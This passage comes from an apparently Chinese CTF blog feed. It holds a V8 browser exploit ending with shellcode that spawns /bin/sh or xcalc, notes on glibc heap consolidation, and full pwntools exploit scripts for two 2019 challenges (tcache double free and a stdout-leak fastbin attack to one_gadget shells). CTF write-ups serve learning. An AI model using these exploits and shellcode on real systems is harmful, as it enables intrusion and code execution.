0x2500000cb7732401</span></span><br><span class="line"><span class="comment">01:0008│   0x2e0fdf0a22e8 —▸ 0xcb773240c71 ◂— 0xcb7732408</span></span><br><span class="line"><span class="comment">... ↓</span></span><br><span class="line"><span class="comment">03:0018│   0x2e0fdf0a22f8 —▸ 0x7f1309fb0000 ◂— 0x0</span></span><br><span class="line"><span class="comment">04:0020│   0x2e0fdf0a2300 ◂— 0x10000</span></span><br><span class="line"><span class="comment">05:0028│   0x2e0fdf0a2308 ◂— 0xffff</span></span><br><span class="line"><span class="comment">06:0030│   0x2e0fdf0a2310 —▸ 0x56121b0e6998 —▸ 0x7ffc3b495e40 ◂— 0x7ffc3b495e40</span></span><br><span class="line"><span class="comment">07:0038│   0x2e0fdf0a2318 —▸ 0xcb773240c71 ◂— 0xcb7732408</span></span><br><span class="line"><span class="comment">08:0040│   0x2e0fdf0a2320 —▸ 0x56121b16ae00 ◂— 0x0</span></span><br><span class="line"><span class="comment">09:0048│   0x2e0fdf0a2328 —▸ 0xcb7732404d1 ◂— 0xcb7732405</span></span><br><span class="line"><span class="comment">0a:0050│   0x2e0fdf0a2330 ◂— 0x0</span></span><br><span class="line"><span class="comment">... ↓</span></span><br><span class="line"><span class="comment">0e:0070│   0x2e0fdf0a2350 —▸ 0x56121b16ae20 ◂— 0x0</span></span><br><span class="line"><span class="comment">0f:0078│   0x2e0fdf0a2358 —▸ 0xcb7732404d1 ◂— 0xcb7732405</span></span><br><span class="line"><span class="comment">10:0080│   0x2e0fdf0a2360 —▸ 0x56121b0dccd0 —▸ 0xcb773240751 ◂— 0x6200000cb7732407</span></span><br><span class="line"><span class="comment">11:0088│   0x2e0fdf0a2368 —▸ 0x1fa397b38000 ◂— movabs r10, 0x1fa397b38260 \/\* 0x1fa397b38260ba49 \*\/</span></span><br><span class="line"><span class="comment">12:0090│   0x2e0fdf0a2370 —▸ 0x1c02c944fc79 ◂— 0x710000182d332891</span></span><br><span class="line"><span class="comment">13:0098│   0x2e0fdf0a2378 —▸ 0x1c02c944fee9 ◂— 0x710000182d3328ad</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] wasm code address 0x"</span> + hex(code_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> data_view_addr = addressOf(data_view);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xb0</span>, <span class="number">0x3b</span>, <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0xff</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>,</span><br><span class="line">    <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x48</span>, <span class="number">0xc1</span>, <span class="number">0xef</span>, <span class="number">0x08</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> backing_store_addr = read(data_view_addr + <span class="number">0x18</span>n) + <span class="number">0x20</span>n - <span class="number">1</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] backing_store_addr 0x"</span> + hex(backing_store_addr));</span><br><span class="line">write(backing_store_addr, code_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; shellcode.length; i++)</span><br><span class="line">&#123;</span><br><span class="line">    data_view.setUint8(i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">func();</span><br></pre></td></tr></table></figure>

<p>这样执行就可以get shell了</p>
<p>当然，一般做题的时候会让你弹出计算器，将shellcode改为如下即可：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x50</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0xb8</span>, <span class="number">0x2e</span>, <span class="number">0x79</span>, <span class="number">0x62</span>, <span class="number">0x60</span>, <span class="number">0x6d</span>, <span class="number">0x62</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x50</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x68</span>, <span class="number">0x3b</span>, <span class="number">0x31</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x81</span>, <span class="number">0x34</span>, <span class="number">0x24</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x4c</span>, <span class="number">0x41</span>, <span class="number">0x59</span>,</span><br><span class="line">    <span class="number">0x3d</span>, <span class="number">0x50</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x52</span>, <span class="number">0x6a</span>, <span class="number">0x08</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xe2</span>, <span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x79</span>, <span class="number">0x62</span>, <span class="number">0x60</span>, <span class="number">0x6d</span>, <span class="number">0x62</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x56</span>, <span class="number">0x6a</span>, <span class="number">0x08</span>, <span class="number">0x5e</span>, <span class="number">0x48</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0xe6</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<p>这段代码相当于执行了<code>execve(&#39;/usr/bin/xcalc&#39;,&#39;xcalc&#39;,&#39;DISPLAY=:0&#39;)</code></p>
<p>我现在也不晓得为啥是这样</p>
<p>总之直接用<code>execve(&#39;/usr/bin/xcalc&#39;,NULL,NULL)</code>是不行的</p>
<h4 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h4><p>若想在chrome中弹出计算器，一定要用<code>path/to/chrome --no-sandbox</code>这样的方式打开，不然无法正常执行shellcode</p>
<h2 id="其他大佬的骚操作"><a href="#其他大佬的骚操作" class="headerlink" title="其他大佬的骚操作"></a>其他大佬的骚操作</h2><p>泄露elf基地址，libc地址，再通过libc地址泄露栈地址，然后构造ROP链，接着劫持返回地址……</p>
<p>这种方法不适用于我所遇到的情况……即chrome中的v8的各种偏移与我编译的不一样……</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题似乎并没有什么难度，但是对于我这样的菜鸟来说又充满了挑战与趣味性（v8编译的问题我就整了3天）</p>
<p>接下来就准备看一下队友要到的大佬的数字经济的exp，尝试去复现了</p>
<p>话说今天的360个人赛的pwn真简单……但是我也意识到了除了pwn其他的我啥也不太了解……</p>
<p>是太专了么？</p>
]]></content>
      <categories>
        <category>browser</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>chrome</tag>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>free时的向上合并</title>
    <url>/2019/10/16/free%E6%97%B6%E7%9A%84%E5%90%91%E4%B8%8A%E5%90%88%E5%B9%B6/</url>
    <content><![CDATA[<p>在一些pwn的题目中，有些题目最主要的漏洞点在off by null，所以就会存在一些必须触发向上合并才能进行利用的情况，在此简述一下触发向上合并所需条件</p>
<a id="more"></a>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24 malloc.c:4036</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">	unlink(av, nextchunk, bck, fwd);</span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>一般的利用方法就是，先malloc多个块，结构如下 (x86_64) ：</p>
<table>
<thead>
<tr>
<th align="center">malloc(size)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&gt;= 0x80</td>
</tr>
<tr>
<td align="center">&lt;= 0x70</td>
</tr>
<tr>
<td align="center">&lt;= 0x70</td>
</tr>
<tr>
<td align="center">&lt;= 0x70</td>
</tr>
<tr>
<td align="center">……</td>
</tr>
<tr>
<td align="center">&lt;= 0x70 | 8</td>
</tr>
<tr>
<td align="center">0xf0</td>
</tr>
</tbody></table>
<ul>
<li>先free第一块，此时第二块的prev_size会变成第一块的size，且当前块的fd与bk会变成main_arena相应的地址</li>
<li>填充倒数第三快，将最后一块的prev_size填写为第一块到最后一块的offset，然后再利用off by null将最后一块的prev_inuse覆盖为0</li>
<li>free最后一块</li>
</ul>
<p>参照如上代码此时，会先检查最后一块的prev_inuse位，此时它是0，所以会进入第一个if中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>它会根据prev_size找到前一块，即我们malloc的第一块，然后会将它及进行unlink</p>
<p>由于第一块的fd与bk都是它在main_arena的相应地址，因此unlink顺利通过</p>
<p>但是，事实上，不知为何，有一个检查并没有在源码上体现（可能是我没看见），它会在unlink之前检查一下prev_chunk即第一块的next_chunk的prev_size是否它的size相同。</p>
<p>接下来检查下一块是否是top chunk，很明显，是，所以进else</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">     <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">     nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* consolidate forward */</span></span><br><span class="line">     <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">unlink(av, nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br><span class="line">     &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>之后基本就无需操心了，它会直接进行下去</p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>free</tag>
        <tag>malloc</tag>
      </tags>
  </entry>
  <entry>
    <title>数字经济2019 pwn writeup</title>
    <url>/2019/10/06/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E2019/</url>
    <content><![CDATA[<p>国庆期间做了个小程序，没怎么学二进制……用这个来回一下档</p>
<p>所有题目都在：<a href="https://github.com/DayJun/Blogs/tree/master/Articles/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E2019" target="_blank" rel="noopener">Github</a></p>
<a id="more"></a>
<h1 id="amazon"><a href="#amazon" class="headerlink" title="amazon"></a>amazon</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &apos;/home/dajun/binary/shuzijingji/amazon/amazon&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>保护全开</p>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>这是一个模拟购物的程序，有四项基本功能</p>
<ol>
<li>buy</li>
<li>show</li>
<li>checkout</li>
<li>exit</li>
</ol>
<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul>
<li>在checkout函数中free之后没有没有清空指针</li>
</ul>
<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><ul>
<li>它对可控制输入的位置做了限定，为指针 + 0x20的位置</li>
</ul>
<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>此处效仿同学</p>
<ol>
<li>利用Tcache的特点，对同一个0x100size的块free7次，将该size的Tcache数组填满</li>
<li>再次对该块free，然后show，可得到libc地址</li>
<li>此后，malloc的块都是从0x100size的块上分下来的</li>
<li>malloc两个小块，再malloc一个0x100size的大块，此时两小块皆处于大块内</li>
<li>控制第二个小块的fd指针，控制块分配到realloc_hook</li>
<li>将realloc_hook覆盖成one_gadget，再将malloc_hook覆盖成realloc+4</li>
<li>getshell</li>
</ol>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">success = <span class="keyword">lambda</span> x, y:log.success(x + <span class="string">' '</span>+ y)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./amazon'</span></span><br><span class="line">libc_name = <span class="string">'./libc-2.27.so'</span></span><br><span class="line"><span class="comment">#ip = 'chall.pwnable.tw'</span></span><br><span class="line"><span class="comment">#port = 10104</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">0</span>:</span><br><span class="line">    io = remote(<span class="string">'172.17.0.2'</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, cont)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'What item do you want to buy: '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'How many: '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'How long is your note: '</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">'Content: '</span>)</span><br><span class="line">    sl(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'Which item are you going to pay for: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'abc'</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    check(<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line">rn(<span class="number">6</span>)</span><br><span class="line">leak = u64(rn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'leak'</span>, hex(leak))</span><br><span class="line">base = leak - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">'base'</span>, hex(base))</span><br><span class="line">libc.address = base</span><br><span class="line">malloc_hook = libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc = libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'abc'</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'abc'</span>)</span><br><span class="line">check(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'t'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p64(malloc_hook - <span class="number">0x28</span>))</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x18</span>, p64(base + <span class="number">0x4f322</span>) + p64(realloc+<span class="number">4</span>))</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h1 id="fkroman"><a href="#fkroman" class="headerlink" title="fkroman"></a>fkroman</h1><h2 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &apos;/home/dajun/binary/shuzijingji/fkroman/fkroman&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>保护全开</p>
<h2 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h2><p>喜闻乐见的菜单程序，有如下基本功能</p>
<ol>
<li>alloc</li>
<li>show</li>
<li>free</li>
<li>edit</li>
<li>exit</li>
</ol>
<h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul>
<li>依旧是free之后没有清空指针</li>
<li>edit函数可以导致溢出</li>
</ul>
<h3 id="难点-1"><a href="#难点-1" class="headerlink" title="难点"></a>难点</h3><ul>
<li>没有直接输出内容的函数</li>
</ul>
<h3 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h3><p>所幸见过一次这种题，当时没做出来，死活想不出来怎么leak</p>
<ol>
<li>malloc几个块，其中要有一个unsorted bin，并将其free</li>
<li>通过堆溢出，改变unsorted bin的size与fd指针的最后两个字节，将其分配到_IO_2_1_stdout_结构（看运气）</li>
<li>更改_IO_2_1_stdout_结构的flag为0xfbda1800，以及<br> _IO_read_ptr<br> _IO_read_end<br> _IO_read_base<br> _IO_write_base<br>为0，以及_IO_write_ptr的最后一字节为\x00</li>
<li>leak出libc地址，剩下就是简单的覆盖malloc_hook为one_gadget来getshell</li>
</ol>
<h2 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h2><p>考验欧皇还是非酋的时候到了</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./fkroman'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#io = process('./fkroman')</span></span><br><span class="line">io = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Size: '</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add1</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    <span class="comment">#ru('Index: ')</span></span><br><span class="line">    sl(str(idx))</span><br><span class="line">    <span class="comment">#ru('Size: ')</span></span><br><span class="line">    sl(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, cont)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Size: '</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">'Content: '</span>)</span><br><span class="line">    sl(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit1</span><span class="params">(idx, size, cont)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Size: '</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">'Content: '</span>)</span><br><span class="line">    s(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    io = remote(<span class="string">'121.40.246.48'</span>, <span class="number">9999</span>)</span><br><span class="line">    <span class="comment">#io = process('./fkroman', env = &#123;"LD_PRELOAD":"./a.so"&#125;)</span></span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit1(<span class="number">1</span>,<span class="number">0xa</span>+<span class="number">0x98</span>, <span class="string">'/bin/sh\x00'</span> + <span class="string">'a'</span>*<span class="number">0x88</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + <span class="string">'\xdd\x25'</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit1(<span class="number">0</span>, <span class="number">1</span>, <span class="string">'\x10'</span>)</span><br><span class="line">    add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">6</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">3</span> + <span class="string">'a'</span>*<span class="number">0x30</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span></span><br><span class="line">    edit1(<span class="number">7</span>, len(payload), payload)</span><br><span class="line">    rn(<span class="number">0x40</span>)</span><br><span class="line">    leak = u64(rn(<span class="number">8</span>))</span><br><span class="line">    log.success(<span class="string">"leak: "</span>+hex(leak))</span><br><span class="line">    libc_base = leak - <span class="number">192</span> - libc.sym[<span class="string">'_IO_2_1_stderr_'</span>]</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    log.success(<span class="string">'libc_base: '</span>+hex(libc.address))</span><br><span class="line">    _free_hook = libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">    _malloc_hook = libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    log.success(<span class="string">'malloc hook: '</span>+hex(_malloc_hook))</span><br><span class="line">    r()</span><br><span class="line">    raw_input()</span><br><span class="line">    add(<span class="number">14</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">15</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">8</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">9</span>, <span class="number">0x60</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    edit1(<span class="number">9</span>, <span class="number">8</span>, p64(_malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    r()</span><br><span class="line">    sl(<span class="string">''</span>)</span><br><span class="line">    sl(<span class="string">''</span>)</span><br><span class="line">    r()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'--------------------------'</span></span><br><span class="line">    add(<span class="number">10</span>, <span class="number">0x60</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'--------------------------'</span></span><br><span class="line">    add(<span class="number">11</span>, <span class="number">0x60</span>)</span><br><span class="line">    sys = libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    one_gadget = libc.address + <span class="number">0x4526a</span> <span class="comment">#0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">    </span><br><span class="line">    edit1(<span class="number">11</span>, <span class="number">0x1b</span>, <span class="string">'\x00'</span>*<span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'--------------------------'</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="number">0x10</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span 